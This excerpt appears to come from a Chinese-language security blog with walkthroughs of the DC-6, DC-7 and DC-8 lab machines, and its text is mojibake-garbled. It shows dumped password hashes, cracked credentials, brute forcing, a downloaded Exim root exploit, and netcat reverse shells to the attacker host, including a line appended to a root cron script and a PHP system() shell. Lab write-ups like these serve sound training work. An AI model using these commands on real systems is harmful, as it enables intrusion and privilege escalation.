<p>Database: d7db<br>Table: users<br>[2 entries]<br>+â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”+<br>| name  | pass                                                    |<br>+â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”+<br>| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |<br>| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |<br>+â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”+</p>
</blockquote>
<p>è·‘å‡ºæ¥ä¸¤æ¡æ•°æ® ï¼Œä½†æ˜¯å¯†ç æ˜¯åŠ å¯†çš„ï¼Œæ ¹æ®johnç”¨æˆ·åæç¤ºï¼Œä½¿ç”¨<code>john</code>è§£å¯†</p>
<br>

<p><code>admin</code> ä½¿ç”¨johnæ²¡è·‘å‡ºæ¥</p>
<p><code>john</code> å¯†ç ä¸º<code>turtle</code></p>
<p><code>http://192.168.18.141/user/</code>ç™»å½•æˆåŠŸ</p>
<p>æ‰“å¼€contentçœ‹çœ‹</p>
<p><img src="/posts/437699f/content.png"></p>
<br>

<h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>contact usé¡µé¢å¯ä»¥ç¼–è¾‘</p>
<p>ä¿®æ”¹æˆphpæ ¼å¼</p>
<p><img src="/posts/437699f/ncshell.png"></p>
<p><img src="/posts/437699f/submit.png"></p>
<p>åå¼¹äº¤äº’shell</p>
<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p><img src="/posts/437699f/python_shell.png"></p>
<h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>  æŸ¥çœ‹å…·æœ‰rootæƒé™çš„å‘½ä»¤</p>
<p><img src="/posts/437699f/find.png"></p>
<p>è¯•ç€åˆ©ç”¨ä¸‹exim4</p>
<p>æŸ¥çœ‹exim4ç‰ˆæœ¬</p>
<p><code>exim4 --version</code></p>
<blockquote>
<p>Exim version 4.89 </p>
</blockquote>
<p><code>searchsploit  exim 4</code></p>
<p>æ‰¾ä¸‹expï¼Œé€‰æ‹©46996.sh,æ‹·è´åˆ°æœ¬åœ°ï¼Œå¹¶å¼€å¯kaliçš„httpæœåŠ¡</p>
<blockquote>
<p>cp /usr/share/exploitdb/exploits/linux/local/46996.sh dc8.sh</p>
<p>python2 -m SimpleHTTPServer</p>
</blockquote>
<p>åœ¨é¶æœºä¸Šä¸‹è½½kaliçš„shell,å…ˆå›åˆ°/tmp ç›®å½•ä¸‹</p>
<blockquote>
<p>wget <a href="http://192.168.18.131:8000/dc8.sh">http://192.168.18.131:8000/dc8.sh</a></p>
</blockquote>
<p>æ³¨æ„:ç›´æ¥æŠŠexpä¸‹è½½è¿‡å»æ˜¯æ— æ³•ä½¿ç”¨çš„ï¼Œ<code>sed -i -e &#39;s/\r$//&#39; dc8.sh</code></p>
<blockquote>
<p>www-data@dc-8:/tmp$ ls<br>ls<br>getShell.sh<br>www-data@dc-8:/tmp$ chmod 777 dc8.sh<br>chmod 777 dc8.sh<br>www-data@dc-8:/tmp$ ./dc8.sh</p>
</blockquote>
<p>çœ‹ä¸‹æç¤ºç”¨æ³•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Usage (setuid method):</span><br><span class="line"></span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m setuid</span><br><span class="line"># Preparing setuid shell helper...</span><br><span class="line"># Delivering setuid payload...</span><br><span class="line"># [...]</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 &#x2F;tmp&#x2F;pwned</span><br><span class="line"># # id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"># Usage (netcat method):</span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m netcat</span><br><span class="line"># Delivering netcat payload...</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"># id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/437699f/flag.png"></p>
<br>

<br>

<blockquote>
<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://www.freebuf.com/articles/web/261074.html">https://www.freebuf.com/articles/web/261074.html</a></p>
<p><a href="https://my.oschina.net/u/3896378/blog/4427624">https://my.oschina.net/u/3896378/blog/4427624</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges7</title>
    <url>/posts/9488740e/</url>
    <content><![CDATA[<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><blockquote>
<p>ç½‘æ®µ        192.168.18.0/24</p>
<p>kali        192.168.18.131</p>
<p>é¶æœº        192.168.18.140</p>
</blockquote>
<h4 id="æ‰«æç½‘æ®µ"><a href="#æ‰«æç½‘æ®µ" class="headerlink" title="æ‰«æç½‘æ®µ"></a>æ‰«æç½‘æ®µ</h4><blockquote>
<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 14:16 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00045s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>53/tcp open  domain  dnsmasq 2.78<br>MAC Address: 00:50:56:E0:DA:9A (VMware)</p>
<p>Nmap scan report for 192.168.18.140<br>Host is up (0.00055s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Nmap scan report for 192.168.18.254<br>Host is up (0.00025s latency).<br>All 65535 scanned ports on 192.168.18.254 are filtered<br>MAC Address: 00:50:56:E1:37:77 (VMware)</p>
<p>Nmap scan report for 192.168.18.131<br>Host is up (0.0000030s latency).<br>All 65535 scanned ports on 192.168.18.131 are closed</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 64.63 seconds</p>
</blockquote>
<h4 id="æ‰«æé¶æœº"><a href="#æ‰«æé¶æœº" class="headerlink" title="æ‰«æé¶æœº"></a>æ‰«æé¶æœº</h4><blockquote>
<p> kali@kali2020:~$ sudo nmap 192.168.18.140 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-07 21:11 CST<br>Nmap scan report for 192.168.18.140<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>MAC Address: 00:0C:29:7C:A6:2A (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds</p>
</blockquote>
<h4 id="dirsearchæ‰«ç›®å½•"><a href="#dirsearchæ‰«ç›®å½•" class="headerlink" title="dirsearchæ‰«ç›®å½•"></a>dirsearchæ‰«ç›®å½•</h4><blockquote>
<p> <a href="http://192.168.18.140/user/login">http://192.168.18.140/user/login</a></p>
</blockquote>
<br>

<p>è¿›å…¥ä¸»é¡µçœ‹åˆ°æ—¶ä½¿ç”¨çš„<code>Drupa</code>ï¼Œä¹‹å‰çš„dc-1ä¹Ÿæ˜¯ä½¿ç”¨çš„è¿™ä¸ª</p>
<h4 id="æ ¹æ®æç¤ºæ‰¾çº¿ç´¢"><a href="#æ ¹æ®æç¤ºæ‰¾çº¿ç´¢" class="headerlink" title="æ ¹æ®æç¤ºæ‰¾çº¿ç´¢"></a>æ ¹æ®æç¤ºæ‰¾çº¿ç´¢</h4><blockquote>
<p>Welcome to DC-7</p>
<p>DC-7 introduces some â€œnewâ€ concepts, but Iâ€™ll leave you to figure out what they are.  :-)</p>
<p>While this challenge isnâ€™t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably wonâ€™t succeed.</p>
<p>What you will have to do, is to think â€œoutsideâ€ the box.</p>
<p>Way â€œoutsideâ€ the box.  :-)</p>
</blockquote>
<blockquote>
<p>dc-7å¼•å…¥äº†ä¸€äº›â€œæ–°â€æ¦‚å¿µï¼Œä½†æˆ‘è¿˜æ˜¯è®©ä½ ä»¬è‡ªå·±æ¥å¼„æ¸…æ¥šå®ƒä»¬æ˜¯ä»€ä¹ˆã€‚â€”-)<br>è™½ç„¶è¿™ä¸ªæŒ‘æˆ˜å¹¶ä¸å®Œå…¨æ˜¯æŠ€æœ¯æ€§çš„ï¼Œä½†å¦‚æœä½ éœ€è¦è¯‰è¯¸ç²—æš´çš„å¼ºè¿«æˆ–å­—å…¸æ”»å‡»ï¼Œä½ å¯èƒ½ä¸ä¼šæˆåŠŸã€‚<br>ä½ è¦åšçš„æ˜¯ï¼Œæƒ³â€œå¤–é¢â€çš„ç›’å­ã€‚<br>â€œå¤–é¢â€çš„ç›’å­ã€‚â€”-)</p>
</blockquote>
<p>ä¸€ç›´æ²¡ææ‡‚è¿™ä¸ªå¤–ç›’å•¥æ„æ€ï¼Œçœ‹äº†ä¸‹åˆ«äººçš„åšå®¢ï¼ŒåŸæ¥åœ¨ä¸»é¡µä¸‹å·¦ä¸‹è§’æœ‰ä¸ª<code>@DC7USER</code>ï¼Œtwitterä¸Šæç¤º</p>
<p>äº†githubåœ°å€ï¼Œ<code>https://github.com/Dc7User</code>,é‡Œé¢æœ‰ä¸€ä¸ª<code>staffdb</code>,é¦–å…ˆçœ‹ä¸‹<code>config.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">	<span class="variable">$username</span> = <span class="string">&quot;dc7user&quot;</span>;</span><br><span class="line">	<span class="variable">$password</span> = <span class="string">&quot;MdR3xOgB7#dW&quot;</span>;</span><br><span class="line">	<span class="variable">$dbname</span> = <span class="string">&quot;Staff&quot;</span>;</span><br><span class="line">	<span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="sshç™»å½•"><a href="#sshç™»å½•" class="headerlink" title="sshç™»å½•"></a>sshç™»å½•</h3><p>å¯ä»¥å¾—åˆ°ä¸€ä¸ªæ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œè¯•äº†ä¸‹æ— æ³•ç™»å½•ç½‘ç«™</p>
<p>çœ‹çœ‹è¿™ä¸ªè´¦å·å¯†ç èƒ½ä¸èƒ½ç™»å½•ssh</p>
<p><code>dc7user</code> <code>MdR3xOgB7#dW</code>ï¼ŒæˆåŠŸç™»å½•</p>
<blockquote>
<p><strong>dc7user@dc-7:~$ sudo -l</strong><br>-bash: sudo: command not found</p>
<p>** dc-7:~$ sudo **</p>
<p>-bash: sudo: command not found<br>You have new mail in /var/mail/dc7user<br>** dc7user@dc-7:~$ cat /var/mail/dc7user ** .</p>
<p>å†…å®¹å’Œä¸‹é¢mboxå·®ä¸å¤š</p>
</blockquote>
<br>

<blockquote>
<p>** dc7user@dc-7:<del>$ ls **<br>backups  mbox<br>** dc7user@dc-7:</del>$ cat mbox **</p>
<p>å‘ç°äº†3ä¸ªå¤‡ä»½æ–‡ä»¶</p>
<p>æ•°æ®åº“æ–‡ä»¶</p>
<p>/home/dc7user/backups/website.sql</p>
<p>shellè„šæœ¬æ–‡ä»¶ </p>
<p>/opt/scripts/backups.sh</p>
<p>ç½‘ç«™å¤‡ä»½æ–‡ä»¶</p>
<p>/home/dc7user/backups/website.tar.gz</p>
</blockquote>
<br>

<blockquote>
<p>** dc7user@dc-7:~$ cat /opt/scripts/backups.sh  **</p>
<p>#!/bin/bash<br>rm /home/dc7user/backups/*<br>cd /var/www/html/<br>drush sql-dump â€“result-file=/home/dc7user/backups/website.sql<br>cd ..<br>tar -czf /home/dc7user/backups/website.tar.gz html/<br>gpg â€“pinentry-mode loopback â€“passphrase PickYourOwnPassword â€“symmetric /home/dc7user/backups/website.sql<br>gpg â€“pinentry-mode loopback â€“passphrase PickYourOwnPassword â€“symmetric /home/dc7user/backups/website.tar.gz<br>chown dc7user:dc7user /home/dc7user/backups/*<br>rm /home/dc7user/backups/website.sql<br>rm /home/dc7user/backups/website.tar.gz<br>dc7user@dc-7:~ $<br>** dc7user@dc-7:~$ ls -l /opt/scripts/backups.sh **</p>
<p>-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh</p>
</blockquote>
<p>bashè„šæœ¬ä¸­æœ‰ç”¨åˆ°<code>drush</code>å’Œ<code>gpg</code>å‘½ä»¤ï¼ŒæŸ¥æŸ¥ç”¨æ³•</p>
<p>å¯ä»¥ä½¿ç”¨<code>gpg</code>å’Œ<code>drush</code>å‘½ä»¤</p>
<h3 id="ä½¿ç”¨drushä¿®æ”¹ç®¡ç†å‘˜å¯†ç "><a href="#ä½¿ç”¨drushä¿®æ”¹ç®¡ç†å‘˜å¯†ç " class="headerlink" title="ä½¿ç”¨drushä¿®æ”¹ç®¡ç†å‘˜å¯†ç "></a>ä½¿ç”¨drushä¿®æ”¹ç®¡ç†å‘˜å¯†ç </h3><p>drushå¯ä»¥ä¿®æ”¹ç”¨æˆ·å¯†ç </p>
<blockquote>
<p>Drushæ˜¯Drupalçš„å‘½ä»¤è¡Œshellå’ŒUnixè„šæœ¬æ¥å£ã€‚Drush Coreé™„å¸¦äº†è®¸å¤šæœ‰ç”¨çš„å‘½ä»¤ï¼Œå¯ç”¨äºä¸æ¨¡å—/ä¸»é¢˜/é…ç½®æ–‡ä»¶ç­‰ä»£ç è¿›è¡Œäº¤äº’ã€‚</p>
</blockquote>
<p><code>drush user-password admin --password=&quot;123&quot;</code></p>
<blockquote>
<p>dc7user@dc-7:~ $ drush user-password admin â€“password=â€123â€<br>Command user-password needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal environment to run this command.                                                                      [error]<br>The drush command â€˜user-password adminâ€™ could not be executed.                                                                                                                                                                  [error]<br>dc7user@dc-7:~$ </p>
</blockquote>
<p>æ‰§è¡Œå¤±è´¥ï¼Œè¿›å…¥/var/www/htmlç›®å½•è¯•è¯•</p>
<blockquote>
<p>dc7user@dc-7:/var/www/html$ drush user-password admin â€“password=â€123â€<br>Changed password for admin                                                                                                                                                                                                      [success]<br>dc7user@dc-7:/var/www/html$ </p>
</blockquote>
<p>ä¿®æ”¹å¯†ç æˆåŠŸï¼Œè¯•è¯•èƒ½ä¸èƒ½ç™»å½•ç½‘ç«™<code>http://192.168.18.140/user/login</code></p>
<p><code>admin</code>,<code>123</code>æˆåŠŸç™»å½•</p>
<h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>æƒ³åŠæ³•åå¼¹shellï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬è¿æ¥</p>
<p>æ–°å»ºæ–‡ä»¶å‘ç°ç±»å‹æ²¡æœ‰php</p>
<p><img src="/posts/9488740e/nophp.png"></p>
<p>çœ‹çœ‹<code>Extend</code>æ’ä»¶æ‰©å±•èƒ½ä¸èƒ½å®‰è£…php,æ²¡æ‰¾åˆ°ï¼Œéœ€è¦æ‰‹åŠ¨å®‰è£…ï¼Œçœ‹äº†ä¸‹åˆ«äººçš„wp</p>
<p>ä¸‹è½½php filteræ¨¡å—</p>
<blockquote>
<p><a href="https://www.drupal.org/project/php">https://www.drupal.org/project/php</a></p>
</blockquote>
<p><img src="/posts/9488740e/phpinstallerror.png"></p>
<p>æç¤ºå®‰è£…æ ¼å¼åº”è¯¥ä¸º<code>zip tar tgz gz bz2</code></p>
<p>ä¸‹è½½tar.gz ä¿å­˜åˆ°æœ¬åœ°ç„¶åä¸Šä¼ </p>
<p><img src="/posts/9488740e/phpinstall1.png"></p>
<p><img src="/posts/9488740e/phpinstall2.png"></p>
<p><img src="/posts/9488740e/phpinstall3.png"></p>
<p><img src="/posts/9488740e/phpinstall4.png"></p>
<p>å®‰è£…æˆåŠŸ</p>
<p>å†™ä¸ªphpinfo()è¯•è¯•èƒ½ä¸èƒ½æˆåŠŸ</p>
<p><img src="/posts/9488740e/phpinfo1.png"></p>
<p><img src="/posts/9488740e/phpinfo2.png"></p>
<h4 id="å†™ä¸€å¥è¯"><a href="#å†™ä¸€å¥è¯" class="headerlink" title="å†™ä¸€å¥è¯"></a>å†™ä¸€å¥è¯</h4><p><img src="/posts/9488740e/yijuhua.png"></p>
<h4 id="è¿æ¥èšå‰‘"><a href="#è¿æ¥èšå‰‘" class="headerlink" title="è¿æ¥èšå‰‘"></a>è¿æ¥èšå‰‘</h4><p><img src="/posts/9488740e/yijuhua_yijian.png"></p>
<br>

<h4 id="ncåå¼¹shell"><a href="#ncåå¼¹shell" class="headerlink" title="ncåå¼¹shell"></a>ncåå¼¹shell</h4><blockquote>
<p>kali <code>nc -nlvp 8888</code></p>
<p>èšå‰‘ <code>nc -c /bin/sh 192.168.18.131 8888</code></p>
</blockquote>
<p><img src="/posts/9488740e/shell.png"></p>
<p>åå¼¹äº¤äº’shell</p>
<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>å°†åå¼¹shellçš„è„šæœ¬å†™å…¥åˆ°<code>/opt/scripts/backups.sh</code></p>
<p><code>echo &quot;nc -e /bin/bash 192.168.18.131 7777&quot; &gt;&gt; /opt/scripts/backups.sh</code></p>
<p>æˆåŠŸåå¼¹åˆ°rootçš„shell ï¼Œä¸è¿‡éœ€è¦å¤šç­‰ä¸€ä¼šæ‰è¡Œ</p>
<p><img src="/posts/9488740e/rootshell.png"></p>
<p><img src="/posts/9488740e/flag.png"></p>
<blockquote>
<p>æ³¨:å…¶å®å¯ä»¥åœ¨å†™ä¸€å¥è¯çš„æ—¶å€™å¯ä»¥ç›´æ¥å†™åå¼¹shell<br><code>&lt;?php system(&#39;nc -e /bin/sh 192.168.18.131 9999&#39;); ?&gt;</code><br><img src="/posts/9488740e/ncshell.png"></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges6</title>
    <url>/posts/e38f4498/</url>
    <content><![CDATA[<p>TIPS</p>
<blockquote>
<p>CLUE<br>OK, this isnâ€™t really a clue as such, but more of some â€œwe donâ€™t want to spend five years waiting for a certain process to finishâ€ kind of advice for those who just want to get on with the job.</p>
<p>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</p>
</blockquote>
<br>

<p>ç¯å¢ƒ</p>
<blockquote>
<p>ç½‘æ®µ    192.168.18.0/24</p>
<p>kali    192.168.18.131</p>
<p>é¶æœº </p>
</blockquote>
<br>

<p>æ‰«æç½‘æ®µ</p>
<blockquote>
<p><strong>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-06 19:40 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00027s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.137<br>Host is up (0.00047s latency).<br>MAC Address: 00:0C:29:74:F8:D0 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00029s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 1.97 seconds</p>
</blockquote>
<p>æ‰«æé¶æœºå¼€æ”¾çš„ç«¯å£</p>
<blockquote>
<p><strong>kali@kali2020:~$ sudo nmap 192.168.18.137 -p- -sV</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-06 19:41 CST<br>Nmap scan report for 192.168.18.137<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br><strong>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</strong></p>
<p><strong>80/tcp open  http    Apache httpd 2.4.25 ((Debian))</strong></p>
<p>MAC Address: 00:0C:29:74:F8:D0 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds</p>
</blockquote>
<p>å¼€æ”¾äº†22ç«¯å£å’Œ80ç«¯å£</p>
<p>dirsearchæ‰«ä¸€ä¸‹ç›®å½•</p>
<blockquote>
<p>â€¦ ..</p>
<p>[19:44:43] 301 -  321B  - /wp-content  -&gt;  <a href="http://192.168.18.137/wp-content/">http://192.168.18.137/wp-content/</a><br>[19:44:43] 301 -  319B  - /wp-admin  -&gt;  <a href="http://192.168.18.137/wp-admin/">http://192.168.18.137/wp-admin/</a></p>
<p>[19:44:43] 301 -  322B  - /wp-includes  -&gt;  <a href="http://192.168.18.137/wp-includes/">http://192.168.18.137/wp-includes/</a></p>
<p>[19:44:43] 200 -   42KB - /wp-includes/<br>[19:44:43] 500 -    0B  - /wp-content/plugins/hello.php<br>[19:44:43] 200 -    0B  - /wp-config.php    </p>
<p>[19:44:44] 302 -    0B  - /wp-admin/  -&gt;  <a href="http://wordy/wp-login.php?redirect_to=http://192.168.18.137/wp-admin/&amp;reauth=1">http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192.168.18.137%2Fwp-admin%2F&amp;reauth=1</a></p>
<p>[19:44:44] 302 -    0B  - /wp-signup.php  -&gt;  <a href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a></p>
<p>â€¦ â€¦</p>
</blockquote>
<br>

<p>æµè§ˆå™¨ç™»å½•<code>192.168.18.137</code>å‘ç°ä¼šè·³è½¬åˆ°<code>http://wordy</code>ï¼Œé‚£éœ€è¦ä¿®æ”¹ä¸€ä¸‹host</p>
<blockquote>
<p>sudo vim /etc/hosts</p>
<p>192.168.18.137 wordy</p>
</blockquote>
<p>è¿›å…¥ä¸»é¡µå¯ä»¥çœ‹å‡ºè¿™æ˜¯<code>WordPress</code>,ç¬¬äºŒå…³ä¹Ÿæ˜¯WordPress</p>
<p>è¿›å…¥åå°<code>wordy/wp-login.php</code> </p>
<p>ä½¿ç”¨wpscanæ‰«ä¸€ä¸‹</p>
<blockquote>
<p>kali@kali2020:~$ wpscan â€“url wordy -e u</p>
<p>[i] User(s) Identified:</p>
<p>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - <a href="http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1">http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</a><br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)</p>
<p>[+] sarah<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
<p>[+] graham<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
<p>[+] mark<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
<p>[+] jens<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
</blockquote>
<p>ä¸€å…±æ‰«å‡º5ä¸ªç”¨æˆ·<code>admin,sarah,graham,mark,jens</code></p>
<p>æ ¹æ®å®˜ç½‘ä¸Šçš„çº¿ç´¢ï¼Œéœ€è¦ç”¨åˆ°kaliè‡ªå¸¦çš„<code>rockyou.txt</code></p>
<p>ä½†æ˜¯ä½¿ç”¨å‘½ä»¤æ—¶è¯´ä¸å­˜åœ¨ï¼Œå»çœ‹äº†ä¸‹éœ€è¦è§£å‹</p>
<p><code>gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p>
<p><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</code></p>
<blockquote>
<p>kali@kali2020:<del>/Tools/DCchallenges/DCchallenges6$ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords_DC6.txt<br>kali@kali2020:</del>/Tools/DCchallenges/DCchallenges6$ ls<br>passwords_DC6.txt  username.txt</p>
</blockquote>
<p>wpscançˆ†ç ´ä¸€ä¸‹</p>
<blockquote>
<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ wpscan â€“url wordy -U username.txt -P passwords_DC6.txt </p>
<p>[!] Valid Combinations Found:<br> | Username: mark, Password: helpdesk01</p>
</blockquote>
<p>å¾—åˆ°<code>mark    helpdesk01</code></p>
<p>çœ‹çœ‹è¿™ä¸ªè´¦å·èƒ½ä¸èƒ½è¿›å…¥åå°    ï¼ŒæˆåŠŸè¿›å…¥åå°</p>
<p>è¿›å…¥åå°ä¸€ç›´æ²¡æ‰¾åˆ°åˆ‡å…¥ç‚¹ï¼Œçœ‹äº†ä¸‹ç½‘ä¸Šçš„ï¼Œä»Activity monitoræ’ä»¶ä¸ºçªç ´å£</p>
<p>å»æ¼æ´åº“çœ‹çœ‹æœ‰å•¥æ¼æ´å¯ä»¥åˆ©ç”¨</p>
<blockquote>
<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ searchsploit Activity monitor</p>
<hr>
<p> Exploit Title                       |  Path</p>
<hr>
<p>Activity Monitor 2002 2.6 - Remote D | windows/dos/22690.c<br>RedHat Linux 6.0/6.1/6.2 - â€˜pam_cons | linux/local/19900.c<br>WordPress Plugin Plainview Activity  | php/webapps/45274.html</p>
<hr>
<p>Shellcodes: No Results</p>
</blockquote>
<br>

<blockquote>
<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ sudo cp /usr/share/exploitdb/exploits/php/webapps/45274.html 45274.html</p>
</blockquote>
<p>å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸ªActivity monitoræ’ä»¶çš„RCE,æ‰§è¡Œç‚¹åœ¨<code>TOOLS</code>ä¸‹çš„<code>IP or interger</code></p>
<p>æå‰ç›‘å¬kaliçš„ç«¯å£<code>nc -nlvp 8888</code></p>
<p>ä½¿ç”¨burpæŠ“åŒ…</p>
<p><img src="/posts/e38f4498/nc1.png"><br><img src="/posts/e38f4498/nc2.png"></p>
<br>

<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
<p>è¿”å›/home çœ‹åˆ°æœ‰å››ä¸ªç”¨æˆ·ï¼Œ</p>
<blockquote>
<p><strong>cd mark</strong></p>
<p><strong>cd stuff</strong></p>
<p><strong>cat things-to-do.txt</strong></p>
<p>cat things-to-do.txt<br>Things to do:</p>
<ul>
<li>Restore full functionality for the hyperdrive (need to speak to Jens)</li>
<li>Buy present for Sarahâ€™s farewell party</li>
<li>Add new user: graham - GSo7isUM1D4 - done</li>
<li>Apply for the OSCP course</li>
<li>Buy new laptop for Sarahâ€™s replacement</li>
</ul>
</blockquote>
<p>å‘ç°ä¸€ä¸ªè´¦æˆ· <code>graham - GSo7isUM1D4</code></p>
<blockquote>
<p>www-data@dc-6:/home/mark/stuff$ su graham<br>su graham<br>Password: GSo7isUM1D4</p>
<p>graham@dc-6:/home/mark/stuff$</p>
</blockquote>
<p>ææƒ</p>
<p>ä¹Ÿå¯ä»¥å°è¯•ä½¿ç”¨sshç™»å½•</p>
<p><code>kali@kali2020:~$ ssh graham@192.168.18.137</code></p>
<blockquote>
